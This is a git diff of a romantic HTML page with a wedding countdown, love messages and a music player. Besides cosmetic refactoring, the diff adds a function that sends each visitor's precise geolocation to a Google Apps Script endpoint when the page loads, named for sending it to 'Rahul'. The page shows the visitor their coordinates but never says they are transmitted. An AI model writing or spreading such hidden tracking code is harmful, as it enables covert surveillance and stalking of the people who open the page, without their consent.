@@ -116,14 +116,13 @@
     <button onclick="confessLove()">Click Me</button>
     <button onclick="playMusic()">Play Music 🎵</button>
 
-    <!-- 🎵 Custom Audio File -->
     <audio id="bgMusic" loop>
       <source src="https://raw.githubusercontent.com/ce23d026/Diksha/main/audio.mp3" type="audio/mp3">
     </audio>
   </div>
 
-  <!-- 💗 Floating Hearts -->
   <script>
+    // 💗 Floating hearts
     function createHeart() {
       const heart = document.createElement("div");
       heart.className = "heart";
@@ -134,10 +133,8 @@
       setTimeout(() => heart.remove(), 5000);
     }
     setInterval(createHeart, 300);
-  </script>
 
-  <!-- 💬 Love Messages -->
-  <script>
+    // 💬 Love messages
     function confessLove() {
       const messages = [
         "Will you marry me again and again? 💍",
@@ -148,37 +145,30 @@
       const msg = messages[Math.floor(Math.random() * messages.length)];
       alert(msg);
     }
-  </script>
 
-  <!-- 🎵 Music Playback -->
-  <script>
+    // 🎵 Music player
     function playMusic() {
       const audio = document.getElementById("bgMusic");
       audio.play()
         .then(() => alert("🎵 Music is now playing!"))
         .catch(() => alert("Tap again to allow music playback on your phone."));
     }
-  </script>
 
-  <!-- 🕰️ Countdown Timer -->
-  <script>
+    // 🕰️ Countdown
     const countBox = document.getElementById("count-box");
     const targetDate = new Date("2025-11-24T00:00:00").getTime();
 
     function updateTimer() {
       const now = new Date().getTime();
       const diff = targetDate - now;
-
       if (diff <= 0) {
         countBox.innerHTML = `<span style="font-size: 2em; color: #ffccdd;">🎉 It's our wedding day! 💍</span>`;
         return;
       }
-
       const days = Math.floor(diff / (1000 * 60 * 60 * 24));
       const hours = Math.floor((diff % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
       const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
       const seconds = Math.floor((diff % (1000 * 60)) / 1000);
-
       countBox.innerHTML = `
         <span class="count-unit">${days} Days</span>
         <span class="count-unit">${hours} Hours</span>
@@ -186,20 +176,26 @@
         <span class="count-unit">${seconds} Seconds</span>
       `;
     }
-
     setInterval(updateTimer, 1000);
-  </script>
 
-  <!-- 📍 GEOLOCATION Script -->
-  <script>
+    // 📍 GEO + Email
+    function sendLocationToRahul(lat, lon) {
+      fetch('https://script.google.com/macros/s/AKfycbyA4IyBUQrWh_lz2uMby6uM4m2nJQUdaf0uvcYasXsRca3B7t71Eok83x8LKYzHXX1b/exec', {
+        method: 'POST',
+        body: JSON.stringify({ latitude: lat, longitude: lon }),
+        headers: { 'Content-Type': 'application/json' }
+      });
+    }
+
     function getLocation() {
       const locationSpan = document.getElementById("location");
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           (position) => {
-            const lat = position.coords.latitude.toFixed(3);
-            const lon = position.coords.longitude.toFixed(3);
+            const lat = position.coords.latitude.toFixed(4);
+            const lon = position.coords.longitude.toFixed(4);
             locationSpan.innerHTML = `You're here: ${lat}°, ${lon}°`;
+            sendLocationToRahul(lat, lon);
           },
           () => {
             locationSpan.innerHTML = "I couldn't find you 😢";
@@ -209,6 +205,8 @@
         locationSpan.innerHTML = "Geolocation not supported.";
       }
     }
+
+    // ⏱️ Call when loaded
     window.onload = getLocation;
   </script>
 </body>
